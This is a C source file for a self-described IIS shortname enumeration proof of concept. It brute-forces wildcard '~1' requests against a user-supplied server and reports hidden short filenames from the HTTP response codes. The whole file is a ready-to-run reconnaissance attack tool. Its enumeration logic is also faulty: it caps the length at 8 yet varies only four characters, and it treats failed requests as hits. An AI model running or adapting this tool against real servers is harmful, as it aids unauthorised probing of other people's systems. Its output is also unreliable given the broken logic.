#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <unistd.h>

#define MAX_URL_LEN 512
#define MAX_FILENAME_LEN 64
#define CHARSET "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

struct response_data {
    char *data;
    size_t size;
};

static size_t write_callback(void *contents, size_t size, size_t nmemb, struct response_data *response) {
    size_t realsize = size * nmemb;
    char *ptr = realloc(response->data, response->size + realsize + 1);
    
    if (!ptr) {
        printf("Memory allocation failed\n");
        return 0;
    }
    
    response->data = ptr;
    memcpy(&(response->data[response->size]), contents, realsize);
    response->size += realsize;
    response->data[response->size] = '\0';
    
    return realsize;
}

int check_shortname_exists(const char* base_url, const char* shortname) {
    CURL *curl;
    CURLcode res;
    char url[MAX_URL_LEN];
    struct response_data response = {0};
    long response_code;
    
    snprintf(url, sizeof(url), "%s/%s*~1*/", base_url, shortname);
    
    curl = curl_easy_init();
    if (!curl) return -1;
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    
    res = curl_easy_perform(curl);
    
    if (res == CURLE_OK) {
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
    }
    
    curl_easy_cleanup(curl);
    
    if (response.data) {
        free(response.data);
    }
    
    return (res == CURLE_OK && response_code == 404) ? 0 : 1;
}

void enumerate_shortnames(const char* base_url, int max_length) {
    char current_name[MAX_FILENAME_LEN] = {0};
    int found_files = 0;
    
    printf("[*] Starting IIS shortname enumeration on: %s\n", base_url);
    printf("[*] Testing shortname patterns...\n\n");
    
    for (int len = 1; len <= max_length; len++) {
        printf("[+] Testing %d-character combinations...\n", len);
        
        for (int i = 0; i < strlen(CHARSET); i++) {
            memset(current_name, 0, sizeof(current_name));
            current_name[0] = CHARSET[i];
            
            if (len == 1) {
                if (check_shortname_exists(base_url, current_name)) {
                    printf("    [FOUND] Potential shortname: %s*\n", current_name);
                    found_files++;
                }
            } else {
                for (int j = 0; j < strlen(CHARSET) && len >= 2; j++) {
                    current_name[1] = CHARSET[j];
                    
                    if (len == 2) {
                        if (check_shortname_exists(base_url, current_name)) {
                            printf("    [FOUND] Potential shortname: %s*\n", current_name);
                            found_files++;
                        }
                    } else if (len >= 3) {
                        for (int k = 0; k < strlen(CHARSET) && len >= 3; k++) {
                            current_name[2] = CHARSET[k];
                            
                            if (check_shortname_exists(base_url, current_name)) {
                                printf("    [FOUND] Potential shortname: %s*\n", current_name);
                                found_files++;
                            }
                            
                            if (len >= 4) {
                                for (int l = 0; l < strlen(CHARSET); l++) {
                                    current_name[3] = CHARSET[l];
                                    
                                    if (check_shortname_exists(base_url, current_name)) {
                                        printf("    [FOUND] Potential shortname: %s*\n", current_name);
                                        found_files++;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    printf("\n[*] Enumeration complete. Found %d potential shortnames.\n", found_files);
}

void print_usage(const char* program_name) {
    printf("IIS Shortname Enumeration POC\n");
    printf("Usage: %s <target_url> [max_length]\n", program_name);
    printf("  target_url   : Target IIS server URL (e.g., http://example.com)\n");
    printf("  max_length   : Maximum shortname length to test (default: 3)\n");
    printf("\nExample:\n");
    printf("  %s http://example.com 4\n", program_name);
    printf("\nNote: This tool tests for the IIS shortname enumeration vulnerability\n");
    printf("      by sending requests with ~1 patterns to discover hidden files.\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }
    
    char *target_url = argv[1];
    int max_length = (argc >= 3) ? atoi(argv[2]) : 3;
    
    if (max_length < 1 || max_length > 8) {
        printf("Error: max_length must be between 1 and 8\n");
        return 1;
    }
    
    printf("=== IIS Shortname Enumeration POC ===\n");
    printf("Target: %s\n", target_url);
    printf("Max length: %d\n\n", max_length);
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    enumerate_shortnames(target_url, max_length);
    
    curl_global_cleanup();
    
    return 0;
}